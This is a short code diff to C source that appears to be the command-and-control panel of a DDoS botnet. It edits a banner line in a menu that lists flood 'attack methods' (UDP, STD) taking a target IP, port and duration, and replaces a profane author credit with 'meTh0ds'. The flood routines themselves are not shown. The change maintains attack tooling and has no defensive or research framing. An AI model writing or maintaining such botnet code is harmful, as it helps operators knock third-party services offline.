@@ -509,7 +509,7 @@ void *TitleWriter(void *sock) {
                 char attack18  [800];
                 char attack19  [800];
 
-                sprintf(attack1,  "\e[38;5;53mMETHODS MADE BY URMOMMY, ENJOY MOTHERFUCKER\e[0m\r\n");
+                sprintf(attack1,  "\e[38;5;53mmeTh0ds\e[0m\r\n");
                 sprintf(attack2,  "\e[38;5;53mHOME METHODS\e[0m\r\n");
                 sprintf(attack3,  "\e[38;5;20m! UDP \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
                 sprintf(attack4,  "\e[38;5;20m! STD \e[0m[IP] [PORT] [TIME] \e[0m\r\n");
